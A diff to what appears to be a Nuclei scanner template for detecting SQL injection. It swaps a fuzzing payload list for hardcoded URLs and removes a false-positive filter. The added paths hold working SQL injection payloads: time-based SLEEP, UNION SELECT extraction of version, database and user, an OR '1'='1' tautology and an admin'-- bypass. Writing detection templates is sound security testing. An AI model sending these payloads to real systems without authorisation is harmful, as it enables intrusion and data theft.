@@ -7,23 +7,13 @@ info:
 http:
   - method: GET
     path:
-      - "{{BaseURL}}"
-    payloads:
-      sqli_payloads:
-        - "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
-        - "1\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
-        - "1' UNION SELECT NULL,@@version,DATABASE(),USER()--"
-        - "1\" UNION SELECT NULL,@@version,DATABASE(),USER()--"
-        - "' OR '1'='1"
-        - "\" OR \"1\"=\"1"
+      - "{{BaseURL}}?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+      - "{{BaseURL}}?id=1\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+      - "{{BaseURL}}?id=1' UNION SELECT NULL,@@version,DATABASE(),USER()--"
+      - "{{BaseURL}}?query=1' OR '1'='1"
+      - "{{BaseURL}}?user=admin'--"
 
-    fuzzing:
-      - part: query
-        type: replace
-        mode: multiple
-        fuzz:
-          - "{{sqli_payloads}}"
-
+    stop-at-first-match: true
     matchers-condition: and
     matchers:
       - type: status
@@ -33,20 +23,10 @@ http:
       - type: regex
         part: body
         regex:
-          - "(SQL syntax.*?MySQL|Warning.*?mysqli_query|PostgreSQL.*?ERROR|SQLite/JDBCDriver|ODBC Microsoft Access Driver|Oracle error.*?ORA-[0-9]+)"
+          - "(SQL syntax.*?MySQL|Warning.*?mysqli_query|PostgreSQL.*?ERROR|SQLite/JDBCDriver|Oracle error.*?ORA-[0-9]+)"
           - "(?i)(database_user|database_name|database_version)"
           - "(5\\.[0-9]+\\.[0-9]+|8\\.[0-9]+\\.[0-9]+)"
         condition: or
-
-      - type: word
-        part: body
-        negative: true
-        words:
-          - "SQL Injection Tutorial"
-          - "example.com"
-          - "w3schools"
-          - "placeholder"
-          - "prevent sql injection"
 
     extractors:
       - type: regex
